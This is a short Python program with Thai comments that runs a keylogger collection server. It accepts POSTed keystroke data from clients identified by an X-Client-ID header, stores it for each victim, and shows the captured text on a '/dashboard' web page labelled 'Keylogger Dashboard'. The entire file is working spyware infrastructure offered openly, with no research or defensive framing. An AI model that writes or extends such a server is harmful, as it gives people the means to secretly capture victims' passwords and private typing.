from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import datetime

# เก็บข้อมูล Keylog ที่นี่
keylogs = {}

class Handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        # อ่าน Client ID จาก Header
        client_id = self.headers.get('X-Client-ID', 'unknown')
        
        # บันทึกข้อมูล
        if client_id not in keylogs:
            keylogs[client_id] = []
        keylogs[client_id].append({
            'time': datetime.datetime.now().strftime("%H:%M:%S"),
            'data': post_data.decode('utf-8', errors='ignore')
        })
        
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'OK')

    def do_GET(self):
        if self.path == '/dashboard':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            html = """
            <html><body style="background:#111; color:#0f0; font-family:monospace;">
            <h1>Keylogger Dashboard</h1>
            <table border="1" width="100%">
            <tr><th>Client ID</th><th>Time</th><th>Data</th></tr>
            """
            
            for cid, logs in keylogs.items():
                for log in logs:
                    html += f"<tr><td>{cid}</td><td>{log['time']}</td><td>{log['data'][:50]}</td></tr>"
            
            html += "</table></body></html>"
            self.wfile.write(html.encode())
        else:
            self.send_response(404)
            self.end_headers()

if __name__ == "__main__":
    server = HTTPServer(('0.0.0.0', 8080), Handler)
    print("Server running on port 8080...")
    server.serve_forever()
